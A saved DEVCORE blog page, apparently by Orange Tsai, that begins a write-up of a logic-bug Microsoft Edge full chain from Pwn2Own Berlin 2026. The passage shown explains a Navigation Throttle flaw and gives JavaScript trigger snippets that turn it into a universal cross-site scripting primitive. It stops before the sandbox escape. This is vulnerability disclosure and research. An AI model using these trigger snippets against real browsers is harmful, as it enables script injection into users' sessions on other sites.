@@ -1,0 +1,1081 @@
+
+
+<!DOCTYPE html>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta charset="utf-8" />
+    <link href="/images/favicon.png" rel="icon" size="32x32">
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only! | DEVCORE</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
+    <meta name="description" property="og:description" content="A handmade, logic-only Microsoft Edge full chain for Pwn2Own Berlin 2026, with no memory corruption and no AI: a sourceless navigation becomes a 0-click UXSS, and an arbitrary file write via Immersive Reader escapes the sandbox. The chain won the Pwnie Award for Epic Achievement." />
+    <meta name="keywords" content="Pwn2Own Berlin 2026, Microsoft Edge, full chain, logic bugs, UXSS, sandbox escape, Chromium, Navigation Throttle, Immersive Reader, protocol handler, Pwnie Awards, Epic Achievement, Orange Tsai" />
+    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
+    <meta property="og:title" content="The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only! | DEVCORE 戴夫寇爾" />
+    <meta property="og:url" content="https://devco.re/blog/2026/10/28/the-last-proof-of-human-craft-forging-a-microsoft-edge-full-chain-with-logic-bugs-only-en/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="https://devco.re/assets/img/blog/20261028/cover.jpg" />
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="d3vc0r3">
+    <meta name="twitter:title" content="The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only! | DEVCORE 戴夫寇爾">
+    <meta name="twitter:description" content="A handmade, logic-only Microsoft Edge full chain for Pwn2Own Berlin 2026, with no memory corruption and no AI: a sourceless navigation becomes a 0-click UXSS, and an arbitrary file write via Immersive Reader escapes the sandbox. The chain won the Pwnie Award for Epic Achievement.">
+    <meta name="twitter:creator" content="d3vc0r3">
+    <meta name="twitter:image" content="https://devco.re/assets/img/blog/20261028/cover.jpg">
+    <meta name="twitter:domain" content="devco.re">
+    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
+    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
+    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
+    <meta name='yandex-verification' content='4561963cf1d18fe3' />
+    <meta property="fb:admins" content="120968921404653" />
+
+    <link rel="canonical" href="https://devco.re/blog/2026/10/28/the-last-proof-of-human-craft-forging-a-microsoft-edge-full-chain-with-logic-bugs-only-en/"/>
+    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-GHXJ9PS005');
+    </script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body class="en">
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/en/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Services<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/services/red-team/">
+                            <div class="item">
+
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    Red Team Assessment
+                                </h2>
+                                <p class="two-line">
+                                    Simulation of real-world attacks to identify vulnerabilities and achieve objectives without disrupting business operations.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/opsr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-opsr"></i>
+                                    Offensive Product Security Research
+                                </h2>
+                                <p class="two-line">
+                                    Assess high-risk vulnerabilities across hardware, firmware, and software from an attacker’s perspective—strengthening secure coding and hardening products against advanced threats.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    Penetration Testing
+                                </h2>
+                                <p class="two-line">
+                                    Infiltration of designated enterprise systems to uncover potential vulnerabilities and assess the risks or damages.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    Security Consulting
+                                </h2>
+                                <p class="two-line">
+                                    Consultation of resource distribution and long-term defensive strategies from the attacker’s perspective.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    Security Training
+                                </h2>
+                                <p class="two-line">
+                                    Instruction on defending and preventing incidents with the hacker mindset, also the response procedures and analysis of attacks when incidents happen.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="https://training.devco.re/" target="_blank">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu offsec"></i>
+                                    OffSec Advanced Training <i class="icon open-in-new"></i>
+                                </h2>
+                                <p class="two-line">
+                                    Structured in-person (OffSec Live Training) and online training, featuring up-to-date offensive security skills with OffSec certification and resources.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>Research<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    Overview
+                                </h2>
+                                <p class="two-line">
+                                    Research of updated cybersecurity techniques and trends, assess the security of products, and evolve the red team with broad experience.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    Competitions and Awards
+                                </h2>
+                                <p class="two-line">
+                                    Awards from international cybersecurity competitions.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    Enterprise Vulnerability Reports
+                                </h2>
+                                <p class="two-line">
+                                    Research of the risk of enterprise systems, identification of potential weaknesses, and report to vendors.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    International Conferences
+                                </h2>
+                                <p class="two-line">
+                                    Sharing vulnerability research and security knowledge at international cybersecurity conferences.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE List
+                                </h2>
+                                <p class="two-line">
+                                    Discovery of critical vulnerabilities in leading international products and services.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>Company<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/en/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                Company Overview
+                            </h2>
+                            <p>
+                                Founded by a world-class white hat hacker team, providing cybersecurity services including Red Team Assessment,  Penetration Testing, Security Consulting, and Security Training.
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/en/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    Team Members
+                                </h2>
+                                <p class="two-line">
+                                    Composed of cybersecurity experts with the hacker mindset, exploring innovative exploitation techniques with high morality and extreme caution.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    Achievements
+                                </h2>
+                                <p class="two-line">
+                                    DEVCORE has been invited to leading cybersecurity conferences, has uncovered hundreds of critical product vulnerabilities, and helped enterprises improve their defensive capabilities.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    Corporate Social Responsibility
+                                </h2>
+                                <p class="two-line">
+                                    We provide diverse internship channels and programs to nurture the next generation and promote cybersecurity awareness.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    Job Opportunities
+                                </h2>
+                                <p class="two-line">
+                                    Join us to secure the world and improve the cybersecurity industry together.
+                                </p>
+                            </div>
+                        </a>
+                        <a href="https://conf.devco.re/" target="_blank">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu conference"></i>
+                                    DEVCORE CONFERENCE <i class="icon open-in-new"></i>
+                                </h2>
+                                <p class="two-line">
+                                    DEVCORE’s annual technical conference focused on offensive security research, red team insights, and novel attack vectors from real-world operations.
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>News<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/en/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    Latest news
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/en/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    Media Resources
+                                </h2>
+                                <p>
+                                    Media Kit, Logo and Usage Guideline
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/search/">Search</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/en/contact/">Contact</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>Services</span>
+                <div class="menuItem">
+                    <a href="/en/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                Red Team Assessment
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/opsr/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-opsr"></i>
+                                Offensive Product Security Research
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                Penetration Testing
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                Security Consulting
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                Security Training
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="https://training.devco.re/" class="fullwidth" target="_blank">
+                        <div class="item">
+                            <h2>
+                                <i class="icon offsec" style="background-color: transparent;"></i>
+                                OffSec Advanced Training
+                                <i class="icon open-in-new" style="margin-left: auto;"></i>
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>Research</span>
+                <div class="menuItem">
+                    <a href="/en/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/awards/">
+                        <div class="item">
+                            <h2>Competitions and Awards</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Enterprise Vulnerability Reports</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/talks/">
+                        <div class="item">
+                            <h2>International Conferences</h2>
+                        </div>
+                    </a>
+                    <a href="/en/research/cve/">
+                        <div class="item">
+                            <h2>CVE List</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>Company</span>
+                <div class="menuItem">
+                    <a href="/en/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>Company Overview</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/our-team/">
+                        <div class="item">
+                            <h2>Team Members</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/history/">
+                        <div class="item">
+                            <h2>Achievements</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/csr/">
+                        <div class="item">
+                            <h2>Corporate Social Responsibility</h2>
+                        </div>
+                    </a>
+                    <a href="/en/company/jobs/">
+                        <div class="item">
+                            <h2>Job Opportunities</h2>
+                        </div>
+                    </a>
+                    <a href="https://conf.devco.re/" class="fullwidth" target="_blank">
+                        <div class="item">
+                            <h2>DEVCORE CONFERENCE</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>News</span>
+                <div class="menuItem">
+                    <a href="/en/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/en/media-kit/">
+                        <div class="item">
+                            <h2>Media Resources</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/en/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                Search
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/en/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                Contact
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/en/blog/">All Articles</a>
+                </li>
+                <li>
+                    <a href="/en/blog/category/Tech%20Editorials/">Tech Editorials</a>
+                </li>
+                <li>
+                    <a href="/en/media-kit/">Media Resources</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/en/blog/category/Tech Editorials">Tech Editorials</a>
+                    <span class="tag">
+
+                      <a href="/en/blog/tag/Pwn2Own/">#Pwn2Own</a> <a href="/en/blog/tag/Microsoft Edge/">#Microsoft Edge</a> <a href="/en/blog/tag/UXSS/">#UXSS</a> <a href="/en/blog/tag/RCE/">#RCE</a> <a href="/en/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/en/blog/tag/Windows/">#Windows</a> 
+                    </span>
+                    <h1>
+                        The Last Proof of Human Craft: Forging a Microsoft Edge Full Chain with Logic Bugs Only!
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/en/blog/author/orange">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/orange.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/en/blog/author/orange">Orange Tsai</a></span>
+                        <span class="date">2026-10-28</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20261028/cover.jpg"/>
+                    </div>
+                    
+
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<style>
+    .language-plaintext {
+        background-color: rgba(0, 0, 0, 0.04);
+        padding: 0.2em;
+        font-size: 85%;
+    }
+
+    .highlight {
+        border-left: 2px solid #44D62C !important;
+    }
+</style>
+
+<p>I think I should still dump some of my work once in a while, even though it feels like fewer and fewer people actually sit down and read articles these days (or maybe now they all leave it to their agents XD). Anyway, this is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥</p>
+
+<blockquote class="twitter-tweet" data-align="center"><p lang="en" dir="ltr">Confirmed! Orange Tsai (@orange_8361) of DEVCORE Research Team (@d3vc0r3) chained 4 logic bugs to achieve a sandbox escape on Microsoft Edge, earning $175,000 and 17.5 Master of Pwn points. Full win! #Pwn2Own #P2OBerlin https://t.co/vJaIpGG4cD</p>&mdash; TrendAI Zero Day Initiative (@thezdi) <a href="https://x.com/thezdi/status/2054868495888777266?ref_src=twsrc%5Etfw">May 14, 2026</a></blockquote>
+<script async="" src="https://platform.x.com/widgets.js" charset="utf-8"></script>
+
+<p><br /></p>
+
+<p>The whole chain is made up of five bugs and two Windows features. I have also shared the whole bug-hunting and chaining process at this year’s HITCON and Hexacon, plus some fun stories along the way. You can check <a href="https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf">the slides here</a>!</p>
+
+<p>Also, maybe everyone thinks LLMs can already pwn everything in the AI era, so something made entirely by hand somehow feels a bit more precious. That might also be why this chain was nominated for this year’s Pwnie Awards and won the Epic Achievement award. 🎉</p>
+
+<p><img src="/assets/img/blog/20261028/cover.jpg" alt="pwnie-award-2026" width="60%" style="display:block;margin:0 auto" /></p>
+
+<h2 id="lets-navigate">Let’s Navigate!</h2>
+
+<p>So where do we start with a logic-only full chain? Well, since it’s a “browser,” let’s start by looking at how “browsing” (or what Chromium calls “navigation”) works. I won’t go into too much detail in this post, because I think in this era, you can just ask your agents to fill in the details :)</p>
+
+<p>But I’d still recommend reading “<a href="https://docs.google.com/presentation/d/1YVqDmbXI0cllpfXD7TuewiexDNZYfwk6fRdmoXJbBlM/edit">Life of a Navigation</a>” from Chrome University if you want to get the full picture.</p>
+
+<h3 id="the-forgotten-navigation-throttles">The Forgotten Navigation Throttles</h3>
+
+<p>While I was walking through the Chromium Navigation flow, something called “Navigation Throttles” caught my attention. They live in the Browser Process, and intercept all navigation requests initiated by either the Browser or the Renderer. Maybe it’s easy to say this in hindsight, but out of the 3,000+ CVEs Google Chrome has fixed over the past five years, there are only fewer than 20 related to them. So I guess this is also a corner not too many people pay attention to.</p>
+
+<p>Anyway, I started digging into the Navigation Throttles, and checked how Google Chrome and Microsoft Edge implemented them. And while going through the code, I found that Edge has a throttle called <code class="language-plaintext highlighter-rouge">EdgeCAGuidanceNavigationThrottle</code> for its enterprise Entra ID feature (the <code class="language-plaintext highlighter-rouge">CA</code> here stands for <a href="https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview">Conditional Access</a>). The purpose of this throttle is to guide users to the right User Profile when Edge detects them signing in with a work account on a Microsoft website. And to fire this throttle, you have to start a navigation from a specific Microsoft-owned origin, such as <code class="language-plaintext highlighter-rouge">login.live.com</code>:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://guidance-ca-error/?email={email}&amp;switch_profile={url}`</span>
+</code></pre></div></div>
+
+<p>And once the throttle is fired, Edge would compare the email of the current User Profile with <code class="language-plaintext highlighter-rouge">?email={email}</code>. If they don’t match, Edge pops up a dialog guiding you to switch accounts.</p>
+
+<p><img src="/assets/img/blog/20261028/31967dc51ad47a90a2efdbfce50a68e4.png" alt="image" width="60%" style="display:block;margin:0 auto" /></p>
+
+<p><br /></p>
+
+<p>But if they do match, Edge would then grab the URL you were originally heading to from <code class="language-plaintext highlighter-rouge">switch_profile={url}</code>, and launch a new navigation with Chromium’s internal Navigation API:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">NavigateParams</span> <span class="nf">params</span><span class="p">(</span><span class="n">browser</span><span class="p">,</span> <span class="n">switch_profile_url</span><span class="p">,</span> <span class="n">ui</span><span class="o">::</span><span class="n">PAGE_TRANSITION_LINK</span><span class="p">);</span>
+<span class="n">params</span><span class="p">.</span><span class="n">disposition</span> <span class="o">=</span> <span class="n">WindowOpenDisposition</span><span class="o">::</span><span class="n">CURRENT_TAB</span><span class="p">;</span>
+<span class="n">params</span><span class="p">.</span><span class="n">window_action</span> <span class="o">=</span> <span class="n">NavigateParams</span><span class="o">::</span><span class="n">SHOW_WINDOW</span><span class="p">;</span>
+
+<span class="n">Navigate</span><span class="p">(</span><span class="o">&amp;</span><span class="n">params</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>So basically, the throttle cancels the original navigation when the target URL matches a specific internal format, and then launches a new one with the URL from the attacker-controlled Query String, if the conditions are met. Since this new navigation is initiated by the Browser Process, in theory we can do a few things we couldn’t do before, such as jumping to normally prohibited pages like <code class="language-plaintext highlighter-rouge">edge://settings</code> or <code class="language-plaintext highlighter-rouge">devtools://...</code>, or even pseudo-schemes like <code class="language-plaintext highlighter-rouge">javascript:alert(origin)</code>.</p>
+
+<p>Though the JavaScript pseudo-scheme sounds like a powerful primitive, you still need to obtain the Execution Context on <code class="language-plaintext highlighter-rouge">login.live.com</code> to fire the throttle in the first place. So being able to jump to <code class="language-plaintext highlighter-rouge">javascript:</code> doesn’t really give you any extra capability. At most, it’s just like a Self-XSS, or a way to turn an Open Redirect there into XSS. Either way, you’re still only executing JavaScript in the same <code class="language-plaintext highlighter-rouge">login.live.com</code> context.</p>
+
+<p>Honestly, I didn’t take this bug too seriously at first glance. To me, it was just a stronger Open Redirect that could jump to a few more Browser-Level Schemes, and still needed to be chained with other bugs. So the bug just sat in my notes for weeks… 🤦‍♂️</p>
+
+<h3 id="sourceless-navigation-a-new-uxss-primitive">Sourceless Navigation: A New UXSS Primitive</h3>
+
+<p>The turning point was when I was going over the Chromium architecture one day and started thinking: The throttle is handled in the Browser Process, so the new navigation is initiated from the browser as well. However, the page we fired the throttle from, <code class="language-plaintext highlighter-rouge">login.live.com</code>, lives in the Renderer, and while investigating the logic, I couldn’t find any code tying the Browser and Renderer together. So… <code class="language-plaintext highlighter-rouge">CURRENT_TAB</code> refers to which tab, exactly?</p>
+
+<p>To find this out, I ran a quick test and added a delay to the original trigger:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`https://guidance-ca-error/?email={email}&amp;switch_profile={url}`</span>
+<span class="p">},</span> <span class="mi">8000</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>And during the delay, we manually switched the Edge to a new tab to see what would happen, and…</p>
+
+<video src="/assets/img/blog/20261028/18bebd889b986c30a918d70c61799e78.mp4" autoplay="" muted="" loop="" playsinline="" preload="metadata" style="display:block;max-width:100%;height:auto;"></video>
+
+<p><br /></p>
+
+<p>Boom! We got a UXSS on <code class="language-plaintext highlighter-rouge">google.com</code>, and that’s also the first bug of the whole chain. To fully understand the UXSS root cause, we dug into Chromium’s source code. We found that if <code class="language-plaintext highlighter-rouge">Navigate()</code> is called without specifying the <code class="language-plaintext highlighter-rouge">source_contents</code> (the Renderer source to bind to), Chromium would use the current active tab as the Renderer source automatically.</p>
+
+<p><em>↓ <strong>Path:</strong> <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator.cc">chromium/chrome/browser/ui/browser_navigator.cc</a></em></p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">base</span><span class="o">::</span><span class="n">WeakPtr</span><span class="o">&lt;</span><span class="n">content</span><span class="o">::</span><span class="n">NavigationHandle</span><span class="o">&gt;</span> <span class="n">Navigate</span><span class="p">(</span><span class="n">NavigateParams</span><span class="o">*</span> <span class="n">params</span><span class="p">)</span> <span class="p">{</span>
+
+  <span class="c1">// [...]</span>
+
+  <span class="c1">// If no source WebContents was specified, we use the selected one from the</span>
+  <span class="c1">// target browser. This must happen before GetBrowserAndTabForDisposition()</span>
+  <span class="c1">// has a chance to replace |params-&gt;browser| with another one, but after the</span>
+  <span class="c1">// above check that relies on the original source_contents value.</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">params</span><span class="o">-&gt;</span><span class="n">source_contents</span> <span class="o">&amp;&amp;</span> <span class="n">params</span><span class="o">-&gt;</span><span class="n">browser</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">params</span><span class="o">-&gt;</span><span class="n">source_contents</span> <span class="o">=</span> <span class="n">params</span><span class="o">-&gt;</span><span class="n">browser</span>
+                  <span class="o">-&gt;</span><span class="n">GetBrowserForMigrationOnly</span><span class="p">()</span>
+                  <span class="o">-&gt;</span><span class="n">tab_strip_model</span><span class="p">()</span>
+                  <span class="o">-&gt;</span><span class="n">GetActiveWebContents</span><span class="p">();</span> <span class="c1">// &lt;--- [1] Use the active tab as the navigation source</span>
+  <span class="p">}</span>
+
+  <span class="c1">// [...]</span>
+
+  <span class="c1">// If no target WebContents was specified (and we didn't seek and find a</span>
+  <span class="c1">// singleton), we need to construct one if we are supposed to target a new</span>
+  <span class="c1">// tab.</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">contents_to_navigate_or_insert</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">DCHECK</span><span class="p">(</span><span class="o">!</span><span class="n">params</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">.</span><span class="n">is_empty</span><span class="p">());</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">params</span><span class="o">-&gt;</span><span class="n">disposition</span> <span class="o">!=</span> <span class="n">WindowOpenDisposition</span><span class="o">::</span><span class="n">CURRENT_TAB</span><span class="p">)</span> <span class="p">{</span>
+      <span class="c1">// [...]</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="c1">// ... otherwise if we're loading in the current tab, the target is the</span>
+      <span class="c1">// same as the source.</span>
+      <span class="n">DCHECK</span><span class="p">(</span><span class="n">params</span><span class="o">-&gt;</span><span class="n">source_contents</span><span class="p">);</span>
+      <span class="n">contents_to_navigate_or_insert</span> <span class="o">=</span> <span class="n">params</span><span class="o">-&gt;</span><span class="n">source_contents</span><span class="p">;</span>   <span class="c1">// &lt;--- [2] Set it as the target WebContents</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Try to handle non-navigational URLs that popup dialogs and such, these</span>
+    <span class="c1">// should not actually navigate.</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">HandleNonNavigationAboutURL</span><span class="p">(</span>
+            <span class="n">params</span><span class="o">-&gt;</span><span class="n">url</span><span class="p">,</span> <span class="n">contents_to_navigate_or_insert</span><span class="o">-&gt;</span><span class="n">GetBrowserContext</span><span class="p">()))</span> <span class="p">{</span>
+      <span class="c1">// Perform the actual navigation, tracking whether it came from the</span>
+      <span class="c1">// renderer.</span>
+      <span class="n">NavigationController</span><span class="o">::</span><span class="n">LoadURLParams</span> <span class="n">load_url_params</span> <span class="o">=</span>
+          <span class="n">LoadURLParamsFromNavigateParams</span><span class="p">(</span><span class="n">contents_to_navigate_or_insert</span><span class="p">,</span>
+                                          <span class="n">params</span><span class="p">);</span>
+      <span class="n">navigation_handle</span> <span class="o">=</span>
+          <span class="n">contents_to_navigate_or_insert</span><span class="o">-&gt;</span><span class="n">GetController</span><span class="p">().</span><span class="n">LoadURLWithParams</span><span class="p">(</span>
+              <span class="n">load_url_params</span><span class="p">);</span>     <span class="c1">// &lt;--- [3] Start navigation; dispatch Mojo downstream</span>
+    <span class="p">}</span>
+  <span class="c1">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Though the code path requires <code class="language-plaintext highlighter-rouge">params.disposition</code> to be <code class="language-plaintext highlighter-rouge">CURRENT_TAB</code> and <code class="language-plaintext highlighter-rouge">params.source_contents</code> to be <code class="language-plaintext highlighter-rouge">NULL</code>, luckily, those are the defaults, so even Chromium’s own <a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator_params.h;l=54">example code</a> gets this wrong. I guess this should count as a new UXSS attack surface!</p>
+
+<h3 id="the-0-click-challenges">The 0-Click Challenges</h3>
+
+<p>The UXSS primitive we just got sounds great, but firing that still comes with quite a few challenges in practice. Here we list four we faced while weaponizing the UXSS, and how we cracked them with more and more bugs 😉.</p>
+
+<h4 id="1-the-throttle-must-be-fired-from-a-trusted-origin">1. The Throttle Must Be Fired from a Trusted Origin</h4>
+
